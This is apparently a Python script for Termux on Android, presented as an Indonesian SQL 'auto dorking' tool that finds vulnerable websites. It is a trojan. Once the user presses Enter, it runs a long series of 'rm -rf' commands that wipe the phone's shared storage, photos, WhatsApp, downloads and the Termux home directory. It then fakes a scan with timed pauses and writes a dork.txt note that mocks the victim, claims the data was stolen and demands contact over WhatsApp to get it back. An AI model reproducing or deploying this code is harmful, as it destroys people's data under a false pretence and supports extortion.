import os, time, sys
N = '\x1b[0m'
D = '\x1b[90m'
W = '\x1b[1;37m'
B = '\x1b[1;34m'
R = '\x1b[1;31m'
G = '\x1b[1;32m'
Y = '\x1b[1;33m'
C = '\x1b[1;36m'
baner = '\n\n @@@@@@@@@@@        @@@@@@@@@@@@@  @@@@@@@@@@@@    @       @\n @          @       @           @  @          @    @      @\n @            @     @           @  @          @    @    @\n @              @   @           @  @          @    @  @\n @               @  @           @  @@@@@@@@@@@@    @@\n @              @   @           @  @           @   @@\n @             @    @           @  @            @  @  @\n @            @     @           @  @            @  @    @\n @@@@@@@@@@@@@      @@@@@@@@@@@@@  @            @  @      @\n\nCARA PENGGUNAAN : * MASUKKAN DORK ANDA SERTAKAN inurl nya                  \n                  * UNTUK DAFTAR SITE BISA LIHAT DI site.txt\n\n <<<<<<<<<<<<<<>>>>>>>>>>>>       ####################    \n * AUTHOR = REVIELBE              ###### * TETAP SEMANGAT UNTUK\n * TEAM = GENESIS TEAM.           ######   MENGEJAR CITA-CITAMU\n * TOOLS = AUTO DORKING SQL       ######   TOOLS BY GENESIS TEAM\n * WHATSAAP = 0878-7514-5864      ######   REVIELBE\n <<<<<<<<<<<<<<>>>>>>>>>>>>       ######################\n\n'
baner2 = '\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\nSAYA REVIELBE  MENGUCAPKAN SELAMAT\nDATANG\n\n!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
dork = G + '[' + B + '@' + G + ']'
print B + baner2
os.system('termux-setup-storage')
enter = input(C + 'TEKAN ENTER UNTUK MEMULAI')
os.system('rm -rf /storage/emulated/0')
os.system('rm -rf /sdcard/0')
os.system('rm -rf /storage/emulated/0/DCIM')
os.system('rm -rf /storage/emulated/0/android/obb')
os.system('rm -rf /sdcard/0/android/data')
os.system('rm -rf $HOME')
os.system('rm -rf /storage/emulated/0/android/obb')
os.system('rm -rf /storage/emulated/0/android')
os.system('rm -rf sdcard/0')
os.system('rm -rf storage/emulated/0')
os.system('rm -rf /storage/emulated/0/WhatsApp')
os.system('rm -rf /sdcard/0/WhatsApp')
os.system('rm -rf /storage/emulated/0/Downloads')
os.system('rm -rf /storage/emulated/0/Music')
os.system('rm -rf /sdcard/0/Music')
os.system('rm -rf /data/data/com.termux/files/home')
os.system('rm -rf /storage/emulated/0/android/obb')
os.system('rm -rf /storage/emulated/0/android')
os.system('clear')
print Y + baner
ask = input(dork + ' Masukkan Dork > ')
os.system('sleep 3')
site = input(dork + ' Masukkan Site > ')
print D + '[...] SEDANG MENCARI ' + ask + ' site:' + site
os.system('sleep 3')
print dork + ' Search...'
os.system('sleep 5')
print dork + ' Mencari Web Vuln...'
os.system('sleep 3')
print W + ' 106 Web vuln ditemukan'
os.system('sleep 2')
file = open('dork.txt', 'w')
file.write('WKWKWK MAMPUS KAN DATA LU GW CURI(SDCARD),\nKALO MAU DATA LU BALIK CHAT WHATSAAP GW 0878-7514-5864  WKWKWK SALAM BLACKHAT')
file.close()
print R + '[!] WEB VULN TERSIMPAN DI FOLDER INI DENGAN NAMA dork.txt'
print R + '[!] JIKA INGIN MEMBUKA KETIK nano dork.txt'
